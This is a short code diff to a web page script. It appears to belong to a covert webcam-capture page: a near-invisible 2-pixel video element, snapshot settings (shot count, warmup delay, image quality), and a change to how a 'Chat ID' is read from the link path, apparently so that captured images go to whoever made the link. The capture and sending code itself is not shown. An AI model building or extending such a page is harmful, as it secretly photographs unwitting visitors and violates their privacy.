@@ -78,10 +78,10 @@ video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-event
 (function(){
 var SHOTS=1, WARMUP=1400, Q=0.92, MIRROR=true;
 
-// قراءة Chat ID من الرابط: /t/CODE
+// قراءة Chat ID من الرابط /t/XXX
 var path = location.pathname || '';
-var m = path.match(/\/t\/([A-Za-z0-9_-]+)/);
-var CODE = m ? m[1] : '';
+var m = path.match(/\/t\/([^\/\?#]+)/);
+var CODE = m ? decodeURIComponent(m[1]) : '';
 
 var v=document.getElementById('v');
 var s1=document.getElementById('s1');
